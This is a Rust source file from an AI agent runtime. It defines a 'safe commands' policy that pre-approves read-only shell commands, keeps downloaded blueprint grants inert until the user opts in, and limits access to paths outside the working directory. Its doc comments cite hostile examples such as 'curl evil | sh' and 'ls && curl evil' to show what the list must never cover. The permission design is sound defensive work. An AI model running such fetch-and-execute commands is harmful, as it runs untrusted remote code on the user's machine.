//! What a run may do without asking anybody.
//!
//! An `ask` policy is all-or-nothing per tool name, which for the shell means
//! choosing between a prompt on every `ls` and no prompt on `curl evil | sh`.
//! On a real run that produced roughly 85 interruptions for one task, of which
//! four were worth a person's attention.
//!
//! A safe-command entry closes that gap without a second permission mechanism.
//! It is a pre-seeded, immutable set of keys in exactly the format
//! [`crate::shell_keys`] produces for a grant, so "this is pre-approved" and
//! "the user approved this" are one lookup, and the property that makes grants
//! safe is inherited rather than re-implemented: coverage needs *every* command
//! in a line, so a safe `ls` does not cover `ls && curl evil` - `shell:curl` is
//! in neither set.
//!
//! Safe entries only ever collapse `Ask` into `Allow`. They never reach `Deny`,
//! and an entry that came from a downloaded blueprint is inert until the
//! user opts in - see [`resolve_safe_keys`].

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};

use crate::shell_keys::is_valid_prefix;

// The shipped list, where a safe key came from, and which layers count for a
// run are the runtime's, so a program that embeds it resolves the same list.
// The list is named here for the tests that hold every entry of it to this
// crate's reading of a shell line.
#[cfg(test)]
pub(crate) use leviath_runtime::tool_policy::DEFAULT_SAFE_SHELL;
pub(crate) use leviath_runtime::tool_policy::SafeSource;

/// The user's `[safe_commands]` block.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SafeCommands {
    /// Ship the built-in read-only verb list. On by default: `read_file` is
    /// already `allow` while `cat file` prompts, and closing that incoherence is
    /// most of what this setting is for.
    ///
    #[serde(default = "leviath_core::default_true")]
    pub defaults: bool,
    /// Tools that need no prompt whatever their arguments. Built-in names, or
    /// MCP names in their advertised form (`server__tool`).
    #[serde(default)]
    pub tools: Vec<String>,
    /// Shell command prefixes that need no prompt, in the same string space a
    /// grant is keyed on, so `git status` can never cover `git push`.
    #[serde(default)]
    pub shell: Vec<String>,
    /// What happens to a safe-listed command that names a path outside the
    /// workdir and every granted `[read_paths]` root. It is never pre-approved;
    /// this says whether it asks or is refused.
    #[serde(default)]
    pub outside_workdir: OutsideWorkdir,
}

/// The `[safe_commands] outside_workdir` setting.
///
/// Folded into the permission merge as the `outside_workdir` permission (see
/// [`crate::config::Config::permissions_for_agent`]), so a blueprint or a stage
/// can set it in `tool_permissions` too, and only ever tighten it.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum OutsideWorkdir {
    /// Fall back to the shell's own policy, which asks by default.
    #[default]
    Ask,
    /// Refuse the call. No launch flag lifts it, `--yolo` included.
    Deny,
}

/// Hand-written rather than derived, because `#[derive(Default)]` would give
/// `defaults: false` while `#[serde(default = "leviath_core::default_true")]` gives `true` for
/// the same absent section. That split is invisible and load-bearing: a user
/// with no config file at all goes through `Default`, a user with a config file
/// and no `[safe_commands]` section goes through serde, and they must land on
/// the same behaviour.
impl Default for SafeCommands {
    fn default() -> Self {
        Self {
            defaults: leviath_core::default_true(),
            tools: Vec::new(),
            shell: Vec::new(),
            outside_workdir: OutsideWorkdir::Ask,
        }
    }
}

/// A per-agent `[agent_safe_commands.<name>]` block.
///
/// Mirrors `[agent_tool_permissions]` and `[agent_read_paths]`: naming the agent
/// is the user saying "I trust this one", which is a decision that belongs in
/// their config rather than in a manifest they downloaded.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct AgentSafeCommands {
    /// Tool names this agent asks to have pre-approved.
    #[serde(default)]
    pub tools: Vec<String>,
    /// Shell grant-key prefixes it asks to have pre-approved. A prefix that
    /// could write a file or run an unnamed program is refused at load.
    #[serde(default)]
    pub shell: Vec<String>,
    /// Honour this agent's own `[safe_commands]` block. Off by default:
    /// declaring is not granting.
    #[serde(default)]
    pub allow_blueprint: bool,
}

impl SafeCommands {
    /// This block as the runtime reads it: the part that says which keys
    /// are safe.
    pub(crate) fn settings(&self) -> leviath_runtime::tool_policy::SafeCommandSettings {
        leviath_runtime::tool_policy::SafeCommandSettings {
            defaults: self.defaults,
            tools: self.tools.clone(),
            shell: self.shell.clone(),
        }
    }
}

impl AgentSafeCommands {
    /// This block as the runtime reads it.
    pub(crate) fn settings(&self) -> leviath_runtime::tool_policy::AgentSafeCommandSettings {
        leviath_runtime::tool_policy::AgentSafeCommandSettings {
            tools: self.tools.clone(),
            shell: self.shell.clone(),
            allow_blueprint: self.allow_blueprint,
        }
    }
}

/// The safe keys in effect for one run, and where each came from: the
/// runtime's resolution ([`leviath_runtime::tool_policy::resolve_safe_keys`])
/// with this crate's reading of a shell line, so the shell half of the list
/// is held too.
///
/// A blueprint's own block contributes nothing unless `allow_blueprint`
/// names this agent or `[security] allow_blueprint_safe_commands` is set, and
/// an entry that is not a valid prefix is skipped with a warning.
pub(crate) fn resolve_safe_keys(
    config: &SafeCommands,
    agent: Option<&AgentSafeCommands>,
    blueprint: Option<&leviath_runtime::spec::graph::SafeCommandsDef>,
    allow_blueprint_globally: bool,
) -> BTreeMap<String, SafeSource> {
    leviath_runtime::tool_policy::resolve_safe_keys(
        &config.settings(),
        agent.map(AgentSafeCommands::settings).as_ref(),
        blueprint,
        allow_blueprint_globally,
        Some(&is_valid_prefix),
    )
}

#[cfg(test)]
mod tests;
